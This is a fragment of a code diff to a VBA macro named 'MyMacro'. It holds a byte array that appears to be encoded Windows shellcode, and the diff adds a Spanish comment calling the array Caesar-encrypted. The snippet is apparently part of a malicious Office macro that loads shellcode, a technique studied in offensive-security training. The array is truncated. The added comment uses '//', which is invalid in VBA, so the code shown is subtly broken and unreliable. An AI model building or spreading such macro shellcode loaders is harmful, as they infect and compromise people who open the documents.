@@ -10,7 +10,8 @@ Function MyMacro()
     Dim counter As Long
     Dim data As Long
     Dim res As LongPtr
-    
+
+    // Array cifrado con Caesar
     buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,72,49,210,81,101,72,
     ...
     06,0,89,187,224,29,42,10,65,137,218,255,213)
